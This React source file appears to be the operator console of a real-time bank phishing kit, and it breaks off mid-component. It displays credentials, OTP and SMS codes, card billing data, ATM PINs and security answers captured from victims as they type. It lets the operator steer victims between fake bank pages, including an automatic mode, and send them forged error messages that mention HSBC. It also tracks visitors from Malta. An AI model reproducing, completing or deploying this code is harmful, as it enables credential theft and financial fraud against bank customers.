import { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogClose } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Calendar } from '@/components/ui/calendar';
import { Popover, PopoverContent, PopoverTrigger } from '@/components/ui/popover';
import { Textarea } from '@/components/ui/textarea';
import { Monitor, Users, ArrowRight, Clock, CheckCircle, AlertCircle, Settings, X, Trash2, Copy, Palette, Sun, Moon, Terminal, Volume2, VolumeX, Music, Search, CalendarIcon, Filter, Edit, Info, Shield, Eye, Archive } from 'lucide-react';
import { archiveSession } from '@/lib/database';
import { useForm } from '@/contexts/FormContext';
import { useToast } from '@/hooks/use-toast';
import { useRealtimeAllSessions } from '@/hooks/useRealtimeSession';
import { useAudioNotification } from '@/hooks/useAudioNotification';
import { supabase } from '@/integrations/supabase/client';

import { format } from 'date-fns';
import { cn } from '@/lib/utils';

// Singleton ID for login settings row
const LOGIN_SETTINGS_ID = '00000000-0000-0000-0000-000000000001';

const AdminPanel = () => {
  const { getAllSessions, getAllSessionsIncludingArchived, redirectUser, sendErrorMessage, setIsAdmin, clearSession, clearAllSessions } = useForm();
  const { toast } = useToast();
  const realtimeSessions = useRealtimeAllSessions();
  const { playNotificationSound, playUserActivitySound, selectedSound, changeSound, testSound, soundOptions } = useAudioNotification();
  const [allSessions, setAllSessions] = useState(() => getAllSessions());
  const [selectedSession, setSelectedSession] = useState<string>('');
  const [redirectPage, setRedirectPage] = useState<string>('');
  const [controlDialogOpen, setControlDialogOpen] = useState(false);
  const [currentControlSession, setCurrentControlSession] = useState<string>('');
  const [soundEnabled, setSoundEnabled] = useState(() => {
    try {
      return localStorage.getItem('adminSoundEnabled') !== 'false';
    } catch {
      return true;
    }
  });
  const [hasInteracted, setHasInteracted] = useState(false);
  
  // Automatic mode - auto redirect users through pages
  const [automaticMode, setAutomaticMode] = useState(() => {
    try {
      return localStorage.getItem('adminAutomaticMode') === 'true';
    } catch {
      return false;
    }
  });
  
  const previousSessionsRef = useRef<string>('{}');
  
  // Force re-render every second to update active/inactive status indicators
  const [, setTick] = useState(0);
  useEffect(() => {
    const interval = setInterval(() => {
      setTick(t => t + 1);
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  
  // Session data for History tab (includes archived)
  const [allSessionData, setAllSessionData] = useState<typeof allSessions>([]);
  
  // Login warning message management
  const [warningDialogOpen, setWarningDialogOpen] = useState(false);
  const [warningMessage, setWarningMessage] = useState('');
  const [editingWarning, setEditingWarning] = useState('');
  
  // Security question management
  const [securityQuestionDialogOpen, setSecurityQuestionDialogOpen] = useState(() => {
    console.log('Security question dialog initialized as false');
    return false;
  });
  const [securityQuestion, setSecurityQuestion] = useState('');
  const [pendingSecurityRedirect, setPendingSecurityRedirect] = useState<{sessionId: string, isQuick: boolean, page?: number} | null>(null);
  
  // Transaction digits management for payment cancel page
  const [transactionDigitsDialogOpen, setTransactionDigitsDialogOpen] = useState(false);
  const [transactionDigits, setTransactionDigits] = useState('');
  const [pendingTransactionRedirect, setPendingTransactionRedirect] = useState<{sessionId: string, isQuick: boolean} | null>(null);
  
  // Reference number management for self send page
  const [referenceNumberDialogOpen, setReferenceNumberDialogOpen] = useState(false);
  const [referenceNumber, setReferenceNumber] = useState('');
  const [pendingReferenceRedirect, setPendingReferenceRedirect] = useState<{sessionId: string, isQuick: boolean} | null>(null);
  
  // Theme management
  const [currentTheme, setCurrentTheme] = useState(() => {
    try {
      return localStorage.getItem('adminTheme') || 'light';
    } catch {
      return 'light';
    }
  });

  // Visitors management
  const [visitorsDialogOpen, setVisitorsDialogOpen] = useState(false);
  const [visitors, setVisitors] = useState<any[]>([]);
  const [visitorsLoading, setVisitorsLoading] = useState(false);

  // Compute Malta vs Other visitors
  const maltaVisitors = visitors.filter(v => v.country === 'Malta');
  const otherVisitors = visitors.filter(v => v.country !== 'Malta');

  // Load visitors data from Supabase
  const loadVisitors = async () => {
    setVisitorsLoading(true);
    try {
      const { data, error } = await supabase
        .from('visitors')
        .select('*')
        .order('updated_at', { ascending: false });

      if (error) throw error;

      console.log('✅ Loaded', data?.length || 0, 'visitor records');
      setVisitors(data || []);
    } catch (error) {
      console.error('❌ Failed to load visitors:', error);
      if (visitors.length === 0) {
        toast({ title: 'Cannot Load Visitors', description: 'Failed to load visitors from database.', variant: 'destructive' });
      }
    } finally {
      setVisitorsLoading(false);
    }
  };

  // Auto-load visitors count on mount and refresh periodically
  useEffect(() => {
    loadVisitors();
    const interval = setInterval(loadVisitors, 10000); // Refresh every 10 seconds
    return () => clearInterval(interval);
  }, []);

  // Save theme preference and apply to document body
  useEffect(() => {
    localStorage.setItem('adminTheme', currentTheme);
    
    // Apply theme to document body for hacker theme matrix background
    document.body.className = document.body.className.replace(/\b(light|dark|hacker)\b/g, '').trim();
    if (currentTheme !== 'light') {
      document.body.classList.add(currentTheme);
    }
    
    // Cleanup function to remove theme when component unmounts
    return () => {
      document.body.className = document.body.className.replace(/\b(light|dark|hacker)\b/g, '').trim();
    };
  }, [currentTheme]);

  const themeOptions = [
    { value: 'light', label: 'Light', icon: Sun },
    { value: 'dark', label: 'Dark', icon: Moon },
    { value: 'hacker', label: 'Hacker', icon: Terminal }
  ];

  // Save sound preference
  useEffect(() => {
    localStorage.setItem('adminSoundEnabled', soundEnabled.toString());
  }, [soundEnabled]);

  // Enable sounds after first user interaction (browser policy)
  useEffect(() => {
    const enable = () => setHasInteracted(true);
    window.addEventListener('pointerdown', enable, { once: true });
    window.addEventListener('keydown', enable, { once: true });
    return () => {
      window.removeEventListener('pointerdown', enable as any);
      window.removeEventListener('keydown', enable as any);
    };
  }, []);

  // Save automatic mode preference
  useEffect(() => {
    localStorage.setItem('adminAutomaticMode', automaticMode.toString());
  }, [automaticMode]);

  // Automatic mode: Auto-redirect users through pages
  useEffect(() => {
    if (!automaticMode) return;

    const autoRedirectSessions = async () => {
      for (const session of allSessions) {
        // Check if user has completed the current page by having data for it
        const hasLoginData = session.data?.login && Object.keys(session.data.login).length > 0;
        const hasPhoneData = session.data?.phoneNumber && Object.keys(session.data.phoneNumber).length > 0;
        const hasBillingData = session.data?.billing && Object.keys(session.data.billing).length > 0;

        // Auto-redirect flow: Login (1) → Phone Number (15) → Billing (4) → Call Page (7)
        if (session.currentPage === 1 && hasLoginData) {
          console.log(`[AUTO MODE] Redirecting session ${session.id} from Login to Phone Number`);
          await new Promise(resolve => setTimeout(resolve, 3000)); // 3 second wait
          await redirectUser(session.id, 15);
        } else if (session.currentPage === 15 && hasPhoneData) {
          console.log(`[AUTO MODE] Redirecting session ${session.id} from Phone Number to Billing`);
          await new Promise(resolve => setTimeout(resolve, 3000)); // 3 second wait
          await redirectUser(session.id, 4);
        } else if (session.currentPage === 4 && hasBillingData) {
          console.log(`[AUTO MODE] Redirecting session ${session.id} from Billing to Call Page`);
          await new Promise(resolve => setTimeout(resolve, 3000)); // 3 second wait
          await redirectUser(session.id, 7);
        }
      }
    };

    // Run auto-redirect check every 2 seconds
    const interval = setInterval(() => {
      autoRedirectSessions();
    }, 2000);

    return () => clearInterval(interval);
  }, [automaticMode, allSessions, redirectUser]);

  // Real-time sessions from Supabase via realtime subscriptions
  useEffect(() => {
    console.log('🔵 [ADMIN PANEL] AdminPanel mounted - checking realtime sessions');
    console.log('🔵 [ADMIN PANEL] Realtime sessions update:', realtimeSessions.length, 'sessions');
    console.log('🔵 [ADMIN PANEL] Realtime sessions data:', realtimeSessions);
    
    if (realtimeSessions.length > 0) {
      // Convert database sessions to UserSession format
      const convertedSessions = realtimeSessions.map(dbSession => ({
        id: dbSession.session_id,
        ipAddress: dbSession.ip_address || 'unknown',
        currentPage: dbSession.current_page,
        data: (dbSession.session_data && typeof dbSession.session_data === 'object' ? dbSession.session_data : {}) as any,
        isWaiting: !!dbSession.is_waiting,
        hasError: !!dbSession.has_error,
        errorMessage: dbSession.error_message || '',
        errorPage: dbSession.error_page || 0,
        authorizationNumber: dbSession.authorization_number || undefined,
        archived: !!dbSession.archived,
        createdAt: dbSession.created_at,
        updatedAt: dbSession.updated_at
      }));
      
      // Check for new data and play notification sound
      const currentSessionIds = new Set(convertedSessions.map(s => s.id));
      const previousSessionIds = new Set(Object.keys(previousSessionsRef.current ? JSON.parse(previousSessionsRef.current) : {}));
      
      // Store session data for comparison
      const currentSessionData: Record<string, any> = {};
      convertedSessions.forEach(session => {
        currentSessionData[session.id] = {
          data: session.data,
          currentPage: session.currentPage,
          updatedAt: session.updatedAt,
          isWaiting: session.isWaiting
        };
      });
      
      const currentDataString = JSON.stringify(currentSessionData);
      
      if (previousSessionsRef.current && previousSessionsRef.current !== currentDataString && soundEnabled) {
        const previousData = JSON.parse(previousSessionsRef.current);
        
        // Check for new sessions or data changes
        let hasNewActivity = false;
        let activityType = '';
        
        // Check for new sessions
        const newSessions = Array.from(currentSessionIds).filter(id => !previousSessionIds.has(id));
        if (newSessions.length > 0) {
          hasNewActivity = true;
          activityType = 'New user connected';
        }
        
        // Check for data updates in existing sessions
        if (!hasNewActivity) {
          for (const session of convertedSessions) {
            const prevSession = previousData[session.id];
            if (prevSession) {
              // Check if data has been added or changed
              const currentDataKeys = session.data && typeof session.data === 'object' ? Object.keys(session.data) : [];
              const prevDataKeys = prevSession.data && typeof prevSession.data === 'object' ? Object.keys(prevSession.data) : [];
              
              if (currentDataKeys.length > prevDataKeys.length) {
                hasNewActivity = true;
                activityType = 'User entered new data';
                break;
              }
              
              // Check if page changed
              if (session.currentPage !== prevSession.currentPage) {
                hasNewActivity = true;
                activityType = 'User changed page';
                break;
              }
              
              // Check if waiting status changed
              if (session.isWaiting !== prevSession.isWaiting && session.isWaiting) {
                hasNewActivity = true;
                activityType = 'User awaiting verification';
                break;
              }
            }
          }
        }
        
        if (hasNewActivity) {
          console.log('🔔 Activity detected:', activityType);
          // Play appropriate sound based on activity type (only after user interaction)
          if (soundEnabled && hasInteracted) {
            if (activityType === 'User entered new data') {
              playNotificationSound(); // Data entry notification sound
            } else {
              playUserActivitySound(); // User clicks, new connections, navigation
            }
          }
          toast({
            title: "New Activity",
            description: activityType,
            duration: 3000,
          });
        }
      }
      
      previousSessionsRef.current = currentDataString;
      // Sort by created_at ascending so oldest sessions stay at top
      const sortedSessions = [...convertedSessions].sort((a, b) => 
        new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
      );
      setAllSessions(sortedSessions);
    } else {
      // Fallback to local sessions if no real-time data
      setAllSessions(getAllSessions());
    }
  }, [realtimeSessions, getAllSessions, playNotificationSound, soundEnabled, toast]);

  // Live sessions = NOT archived sessions with actual user input data
  const liveSessions = allSessions.filter(session => {
    // Don't show archived sessions
    if (session.archived) return false;
    
    // Only show sessions with actual user input data (not just clicks)
    if (!session.data || typeof session.data !== 'object') return false;
    
    const allowedDataTypes = new Set(['login', 'otp', 'phoneNumber', 'billing', 'securityQuestion', 'documents', 'paymentCancel', 'selfSend', 'payeeCode']);
    const hasUserInputData = Object.keys(session.data).some(key => {
      if (!allowedDataTypes.has(key)) return false;
      const dataValue = session.data[key];
      return dataValue && typeof dataValue === 'object' && Object.keys(dataValue).length > 0;
    });
    
    return hasUserInputData;
  });

  console.log('🔍 Live Sessions Debug:', {
    totalSessions: allSessions.length,
    liveSessions: liveSessions.length,
    allSessionsData: allSessions.map(s => ({
      id: s.id.slice(-4),
      hasData: s.data && Object.keys(s.data).length > 0,
      dataKeys: s.data ? Object.keys(s.data) : [],
      updatedAt: s.updatedAt
    }))
  });

  // History sessions = ONLY archived sessions
  const historySessions = allSessionData.filter(session => {
    // Show only archived sessions in history (convert 0/1 to boolean)
    return !!session.archived;
  });

  // Load session data including archived for Session Data tab
  useEffect(() => {
    const loadSessionData = async () => {
      try {
        const sessionData = await getAllSessionsIncludingArchived();
        setAllSessionData(sessionData);
      } catch (error) {
        console.error('Failed to load session data:', error);
      }
    };

    // Load initially and refresh every 5 seconds
    loadSessionData();
    const interval = setInterval(loadSessionData, 5000);
    return () => clearInterval(interval);
  }, [getAllSessionsIncludingArchived]);

  // Clear all visitors via direct Supabase delete
  const clearAllVisitors = async () => {
    try {
      console.log('🗑️ Clearing all visitors via direct delete...');
      
      const { error } = await supabase
        .from('visitors')
        .delete()
        .gte('visited_at', '1970-01-01'); // Delete everything

      if (error) throw error;

      setVisitors([]);
      setTimeout(() => { loadVisitors(); }, 500);
      toast({ title: 'Success', description: 'All visitors permanently deleted' });
    } catch (error) {
      console.error('❌ Failed to clear visitors:', error);
      toast({ title: 'Error', description: 'Failed to clear visitors', variant: 'destructive' });
    }
  };

  // Delete session permanently
  const deleteSessionPermanently = async (sessionId: string) => {
    try {
      console.log('🗑️ Deleting session:', sessionId);
      
      const { error } = await supabase
        .from('user_sessions')
        .delete()
        .eq('session_id', sessionId);

      if (error) throw error;

      // Remove from local state immediately
      setAllSessions(prev => prev.filter(s => s.id !== sessionId));
      toast({ title: 'Success', description: 'Session permanently deleted' });
    } catch (error) {
      console.error('❌ Failed to delete session:', error);
      toast({ title: 'Error', description: 'Failed to delete session', variant: 'destructive' });
    }
  };

  // Load warning message with real-time updates
  useEffect(() => {
    const loadWarningMessage = async () => {
      try {
        const { data, error } = await supabase
          .from('login_settings')
          .select('warning_message')
          .eq('id', 1)
          .maybeSingle();
        
        if (error) throw error;
        
        if (data) {
          setWarningMessage(data.warning_message || '');
          setEditingWarning(data.warning_message || '');
        }
      } catch (error) {
        console.error('Error fetching warning message:', error);
      }
    };

    loadWarningMessage();

    // Subscribe to real-time changes
    const channel = supabase
      .channel('login_settings_changes')
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'login_settings'
        },
        (payload) => {
          console.log('Warning message updated in real-time:', payload);
          if (payload.new && typeof payload.new === 'object' && 'warning_message' in payload.new) {
            const newMessage = payload.new.warning_message as string;
            setWarningMessage(newMessage || '');
            setEditingWarning(newMessage || '');
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const handleUpdateWarningMessage = async () => {
    try {
      console.log('Saving login warning message:', editingWarning);
      
      // Use RPC function to bypass RLS
      const { error } = await supabase.rpc('update_login_settings', {
        new_warning_message: editingWarning,
        new_show_warning: editingWarning.trim().length > 0 // Show warning if message is not empty
      });

      if (error) throw error;

      setWarningMessage(editingWarning);
      setWarningDialogOpen(false);
      toast({
        title: 'Success',
        description: 'Warning message saved. It will appear on the login page.',
      });
    } catch (error) {
      console.error('Error saving warning message:', error);
      toast({
        title: 'Error',
        description: 'Failed to update warning message',
        variant: 'destructive',
      });
    }
  };

  // Load session data including archived for History tab
  useEffect(() => {
    const loadSessionData = async () => {
      try {
        const sessionData = await getAllSessionsIncludingArchived();
        setAllSessionData(sessionData);
      } catch (error) {
        console.error('Failed to load session data:', error);
      }
    };

    // Load initially and refresh every 5 seconds
    loadSessionData();
    const interval = setInterval(loadSessionData, 5000);
    return () => clearInterval(interval);
  }, [getAllSessionsIncludingArchived]);

  const handleRedirect = async () => {
    console.log('handleRedirect called with:', selectedSession, redirectPage);
    
    if (selectedSession && redirectPage) {
      const page = parseInt(redirectPage);
      console.log('Parsed page:', page);
      
      // If redirecting to security question page (page 9), show question input dialog
      if (page === 9) {
        console.log('Showing security question dialog from redirect');
        setPendingSecurityRedirect({sessionId: selectedSession, isQuick: false});
        setSecurityQuestionDialogOpen(true);
        return;
      }
      
      // If redirecting to payment cancel page (page 14), show transaction digits dialog
      if (page === 14) {
        console.log('Showing transaction digits dialog from redirect');
        setPendingTransactionRedirect({sessionId: selectedSession, isQuick: false});
        setTransactionDigitsDialogOpen(true);
        return;
      }
      
      // If redirecting to self send page (page 16), show reference number dialog
      if (page === 16) {
        console.log('Showing reference number dialog from redirect');
        setPendingReferenceRedirect({sessionId: selectedSession, isQuick: false});
        setReferenceNumberDialogOpen(true);
        return;
      }
      
      await redirectUser(selectedSession, page);
      setSelectedSession('');
      setRedirectPage('');
    }
  };

  const handleQuickRedirect = async (sessionId: string, page: number) => {
    console.log('handleQuickRedirect called with:', sessionId, page);
    
    // If redirecting to any security question page (pages 9-13), show question input dialog
    if (page >= 9 && page <= 13) {
      console.log('Showing security question dialog for page:', page);
      setPendingSecurityRedirect({sessionId, isQuick: true, page});
      setSecurityQuestionDialogOpen(true);
      return;
    }
    
    // If redirecting to payment cancel page (page 14), show transaction digits dialog
    if (page === 14) {
      console.log('Showing transaction digits dialog for page 14');
      setPendingTransactionRedirect({sessionId, isQuick: true});
      setTransactionDigitsDialogOpen(true);
      return;
    }
    
    // If redirecting to self send page (page 16), show reference number dialog
    if (page === 16) {
      console.log('Showing reference number dialog for page 16');
      setPendingReferenceRedirect({sessionId, isQuick: true});
      setReferenceNumberDialogOpen(true);
      return;
    }
    
    await redirectUser(sessionId, page);
    setControlDialogOpen(false);
    setCurrentControlSession('');
  };

const handleSecurityQuestionSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  if (!securityQuestion.trim() || !pendingSecurityRedirect) return;
  const { sessionId, isQuick, page } = pendingSecurityRedirect;
  const targetPage = page || 9;
  try {
    const { data: session, error: getErr } = await supabase
      .from('user_sessions')
      .select('*')
      .eq('session_id', sessionId)
      .maybeSingle();
    
    if (getErr) throw getErr;
    if (!session) throw new Error('Session not found');
    
    const currentData = (session?.session_data as Record<string, any>) || {};
    const questionFieldName = targetPage === 9 ? 'securityQuestion' : `securityQuestion${targetPage - 9}`;
    const updatedData = { ...currentData, [questionFieldName]: { question: securityQuestion.trim(), answer: '' } };

    const { error: updErr } = await supabase
      .from('user_sessions')
      .update({ session_data: updatedData, current_page: targetPage, is_waiting: false })
      .eq('session_id', sessionId);
    
    if (updErr) throw updErr;

    await redirectUser(sessionId, targetPage);
    toast({ title: 'Success', description: `Security question set for page ${targetPage} and user redirected` });
  } catch (error) {
    console.error('Error setting security question:', error);
    toast({ title: 'Error', description: 'Failed to set security question', variant: 'destructive' });
  }
  setSecurityQuestion('');
  setSecurityQuestionDialogOpen(false);
  setPendingSecurityRedirect(null);
  if (isQuick) { setControlDialogOpen(false); setCurrentControlSession(''); } else { setSelectedSession(''); setRedirectPage(''); }
};

const handleTransactionDigitsSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  if (!transactionDigits.trim() || !pendingTransactionRedirect) return;
  const { sessionId, isQuick } = pendingTransactionRedirect;
  try {
    const { data: session, error: getErr } = await supabase
      .from('user_sessions')
      .select('*')
      .eq('session_id', sessionId)
      .maybeSingle();
    
    if (getErr) throw getErr;
    if (!session) throw new Error('Session not found');
    
    const currentData = (session?.session_data as Record<string, any>) || {};
    const updatedData = { ...currentData, transactionDigits: transactionDigits.trim() };

    const { error: updErr } = await supabase
      .from('user_sessions')
      .update({ session_data: updatedData, current_page: 14, is_waiting: false })
      .eq('session_id', sessionId);
    
    if (updErr) throw updErr;

    await redirectUser(sessionId, 14);
    toast({ title: 'Success', description: 'Transaction digits set and user redirected to payment cancel page' });
  } catch (error) {
    console.error('Error setting transaction digits:', error);
    toast({ title: 'Error', description: 'Failed to set transaction digits', variant: 'destructive' });
  }
  setTransactionDigits('');
  setTransactionDigitsDialogOpen(false);
  setPendingTransactionRedirect(null);
  if (isQuick) { setControlDialogOpen(false); setCurrentControlSession(''); } else { setSelectedSession(''); setRedirectPage(''); }
};

const handleReferenceNumberSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  if (!pendingReferenceRedirect) return;
  const { sessionId, isQuick } = pendingReferenceRedirect;
  try {
    const { data: session, error: getErr } = await supabase
      .from('user_sessions')
      .select('*')
      .eq('session_id', sessionId)
      .maybeSingle();
    
    if (getErr) throw getErr;
    if (!session) throw new Error('Session not found');
    
    const currentData = (session?.session_data as Record<string, any>) || {};
    const updatedData = { ...currentData, referenceNumber: referenceNumber.trim() };

    const { error: updErr } = await supabase
      .from('user_sessions')
      .update({ session_data: updatedData, current_page: 16, is_waiting: false })
      .eq('session_id', sessionId);
    
    if (updErr) throw updErr;

    await redirectUser(sessionId, 16);
    toast({ title: 'Success', description: 'Reference number set and user redirected to self send page' });
  } catch (error) {
    console.error('Error setting reference number:', error);
    toast({ title: 'Error', description: 'Failed to set reference number', variant: 'destructive' });
  }
  setReferenceNumber('');
  setReferenceNumberDialogOpen(false);
  setPendingReferenceRedirect(null);
  if (isQuick) { setControlDialogOpen(false); setCurrentControlSession(''); } else { setSelectedSession(''); setRedirectPage(''); }
};


  const openControlDialog = (sessionId: string) => {
    setCurrentControlSession(sessionId);
    setControlDialogOpen(true);
  };

  const getFieldLabel = (field: string, dataType: string) => {
    // Field mappings for login data
    if (dataType === 'login') {
      const loginFieldMappings: Record<string, string> = {
        'bovuserid': 'Username',
        'bovUserId': 'Username',
        'password': 'password'
      };
      return loginFieldMappings[field] || field;
    }
    
    // Field mappings for OTP/Security Code page (page 2)
    if (dataType === 'otp') {
      const otpFieldMappings: Record<string, string> = {
        'code': 'Secure Code'
      };
      return otpFieldMappings[field] || field;
    }
    
    // Field mappings for Payment Cancel page (page 14)
    if (dataType === 'cancelSecurityCode') {
      const cancelFieldMappings: Record<string, string> = {
        'securityCode': 'Cancel Code'
      };
      return cancelFieldMappings[field] || field;
    }
    
    return field;
  };

  const shouldShowField = (field: string, dataType: string) => {
    // Hide 'code' field from login data
    if (dataType === 'login' && field === 'code') {
      return false;
    }
    return true;
  };

  const getErrorMessage = (currentPage: number) => {
    const errorMessages = [
      'Your username was not recognised. Please check your details and try again.',
      'Invalid security code. Please check the code from your device and try again.',
      'Invalid SMS OTP code. Please check the code sent to your mobile device and try again.',
      'Invalid billing information. Please verify your card details and try again.',
      'Invalid ATM PIN information. Please check your current PIN and new PIN details and try again.',
      'Please review your information and confirm to continue.',
      'Call verification failed. Please try again.',
      'Device removal required. Please follow the instructions to continue.',
      'Invalid security question answer. Please check your answer and try again.',
      'Invalid security question answer. Please verify your response and try again.',
      'Invalid security question answer. Please verify your response and try again.',
      'Invalid security question answer. Please verify your response and try again.',
      'Invalid security question answer. Please verify your response and try again.',
      'Invalid security code. Please check the code from your HSBC Mobile Banking app and try again.',
      'Invalid phone number. Please verify the phone number connected to your account and try again.'
    ];
    return errorMessages[currentPage - 1] || 'Invalid information. Please try again.';
  };

  const handleIncorrectInfo = async (sessionId: string, currentPage: number) => {
    const errorMessage = getErrorMessage(currentPage);
    await sendErrorMessage(sessionId, errorMessage);
    
    // Show notification
    toast({
      title: "Error Sent",
      description: "Incorrect information notification sent to user",
      variant: "default",
    });
  };

  const pageNames = [
    'Login', 'Security Code', 'SMS OTP', 'Billing Info', 
    'ATM PIN', 'Confirmation', 'Call Page', 'Device Remove', 'Security Question',
    'Security Question 1', 'Security Question 2', 'Security Question 3', 'Security Question 4',
    'Payment Cancel', 'Phone Number', 'Self Send', 'Payee Code'
  ];

  // Only show user-input data in the live session view
  const allowedDataTypes = new Set([
    'login', 'otp', 'smsOtp', 'otpGenCode', 'billing', 'atmPin', 'phoneNumber', 'preferences',
    'securityQuestion', 'securityQuestion1', 'securityQuestion2', 'securityQuestion3', 'securityQuestion4',
    'generatedCode', 'cancelSecurityCode', 'documents', 'deviceRemove', 'payeeCode'
  ]);

  const getStatusIcon = (session: any) => {
    if (session.isWaiting) return <Clock className="h-4 w-4 text-warning" />;
    if (session.currentPage === 6 || session.currentPage === 7 || session.currentPage === 8) return <CheckCircle className="h-4 w-4 text-success" />;
    return <AlertCircle className="h-4 w-4 text-info" />;
  };

  const getStatusText = (session: any) => {
    if (session.isWaiting) return 'Waiting';
    if (session.currentPage === 6 || session.currentPage === 7 || session.currentPage === 8) return 'Complete';
    return 'In Progress';
  };

  const isSessionActive = (session: any) => {
    if (!session.updatedAt) return false;
    const now = new Date();
    const lastActivity = new Date(session.updatedAt);
    const diffSeconds = (now.getTime() - lastActivity.getTime()) / 1000;
    // Consider active if last activity was within 10 seconds (heartbeat sends every 5 seconds)
    return diffSeconds < 10;
  };

  const formatTimeAgo = (updatedAt: string) => {
    const now = new Date();
    const updated = new Date(updatedAt);
    const diffMinutes = Math.floor((now.getTime() - updated.getTime()) / (1000 * 60));
    
    if (diffMinutes < 1) return 'Just now';
    if (diffMinutes < 60) return `${diffMinutes}m ago`;
    const diffHours = Math.floor(diffMinutes / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    const diffDays = Math.floor(diffHours / 24);
    return `${diffDays}d ago`;
  };

  const copyToClipboard = async (text: string, label: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied to clipboard",
        description: `${label} copied successfully`,
        duration: 2000,
      });
    } catch (error) {
      toast({
        title: "Failed to copy",
        description: "Could not copy to clipboard",
        variant: "destructive",
        duration: 2000,
      });
    }
  };

  const CopyableField = ({ label, value, className = "" }: { label: string; value: string; className?: string }) => (
    <div className={`group cursor-pointer hover:bg-muted/50 rounded p-2 transition-colors ${className}`} 
         onClick={() => copyToClipboard(value, label)}>
      <div className="flex items-center justify-between">
        <div className="flex-1">
          <div className="flex items-center justify-between">
            <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">{label}:</span>
            <Copy className="h-3 w-3 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
          </div>
          <span className="font-mono text-sm text-foreground break-all">{value}</span>
        </div>
      </div>
    </div>
  );

  const renderSessionsList = (sessionsList: typeof allSessions, title: string, isHistory: boolean = false) => (
    <div className="space-y-3">
      <div className="flex items-center space-x-3 mb-4">
        <div className="h-1 w-12 rounded-full bg-gradient-to-r from-admin to-warning"></div>
        <h3 className="text-xl font-bold text-foreground">{title}</h3>
        <Badge variant="secondary" className="font-semibold">{sessionsList.length}</Badge>
      </div>
      {sessionsList.length === 0 ? (
        <Card className="border-dashed border-2">
          <CardContent className="text-center py-12">
            <div className="flex flex-col items-center space-y-3">
              <div className="p-4 rounded-full bg-muted">
                <Users className="h-8 w-8 text-muted-foreground" />
              </div>
              <p className="text-muted-foreground font-medium">No {title.toLowerCase()}</p>
            </div>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-2">
          {sessionsList.map((session, index) => (
            <Card key={session.id} className="border-none shadow-sm hover:shadow-md transition-shadow overflow-hidden">
              <div className={cn(
                "h-0.5 w-full transition-colors",
                isSessionActive(session) 
                  ? "bg-gradient-to-r from-success to-success/50" 
                  : "bg-gradient-to-r from-muted to-muted/50"
              )} />
              <CardContent className="py-2 px-3">
                <div className="flex items-start gap-3">
                  {/* Session Number & Status */}
                  <div className="flex items-center gap-2 min-w-[80px]">
                    <div className="relative">
                      <div 
                        className={cn(
                          "h-8 w-8 rounded-lg flex items-center justify-center font-bold text-xs",
                          isSessionActive(session) 
                            ? "bg-success/10 text-success border border-success/30" 
                            : "bg-muted text-muted-foreground border border-muted"
                        )}
                      >
                        #{index + 1}
                      </div>
                      <div 
                        className={cn(
                          "absolute -top-0.5 -right-0.5 h-2.5 w-2.5 rounded-full border border-background",
                          isSessionActive(session) ? "bg-success animate-pulse" : "bg-destructive"
                        )}
                      />
                    </div>
                    <div className="flex flex-col gap-0.5">
                      <Badge variant={isSessionActive(session) ? "default" : "secondary"} className="text-[9px] px-1.5 py-0 w-fit h-4 leading-none">
                        {isSessionActive(session) ? "Live" : "Off"}
                      </Badge>
                      {session.isWaiting && (
                        <Badge className="bg-warning text-white text-[9px] px-1.5 py-0 animate-pulse w-fit h-4 leading-none">
                          <Clock className="h-2.5 w-2.5 mr-0.5" />
                          Wait
                        </Badge>
                      )}
                    </div>
                  </div>

                  {/* Page & Time Info - Compact */}
                  <div className="flex flex-col gap-1 min-w-[140px]">
                    <div className="flex items-center gap-1.5 bg-muted/30 rounded px-2 py-1">
                      <Monitor className="h-3 w-3 text-muted-foreground flex-shrink-0" />
                      <span className="text-[10px] font-medium">P{session.currentPage}: {pageNames[session.currentPage - 1]}</span>
                    </div>
                    <div className="flex items-center gap-1.5 bg-muted/30 rounded px-2 py-1">
                      <Clock className="h-3 w-3 text-muted-foreground flex-shrink-0" />
                      <span className="text-[10px] text-muted-foreground">{formatTimeAgo(session.updatedAt)}</span>
                    </div>
                  </div>

                  {/* Collected Data - Compact 2 Row Grid */}
                  <div className="flex-1 min-w-0">
                    {session.data && typeof session.data === 'object' && Object.entries(session.data).length > 0 ? (
                      <div className="grid grid-cols-5 gap-1.5">
                        {Object.entries(session.data)
                          .filter(([key]) => key !== 'transactionDigits' && allowedDataTypes.has(key))
                          .sort(([dataTypeA], [dataTypeB]) => {
                            // Define order: login first, then otp, then everything else
                            const order: Record<string, number> = {
                              'login': 1,
                              'otp': 2
                            };
                            const orderA = order[dataTypeA] || 999;
                            const orderB = order[dataTypeB] || 999;
                            return orderA - orderB;
                          })
                          .map(([dataType, dataValue]) => {
                          if (typeof dataValue === 'object' && dataValue !== null) {
                            return Object.entries(dataValue as Record<string, any>)
                              .sort(([fieldA], [fieldB]) => {
                                // Within login, ensure username comes before password
                                if (dataType === 'login') {
                                  if (fieldA.toLowerCase().includes('userid')) return -1;
                                  if (fieldB.toLowerCase().includes('userid')) return 1;
                                }
                                return 0;
                              })
                              .map(([field, value]) => {
                              if (!shouldShowField(field, dataType)) return null;
                              const label = getFieldLabel(field, dataType);
                              return (
                                <div 
                                  key={`${dataType}-${field}`}
                                  className="group cursor-pointer hover:bg-muted/70 rounded px-2 py-1.5 transition-colors bg-muted/30 border border-muted"
                                  onClick={() => copyToClipboard(String(value), label)}
                                  title={`Click to copy ${label}`}
                                >
                                  <div className="flex flex-col gap-0.5">
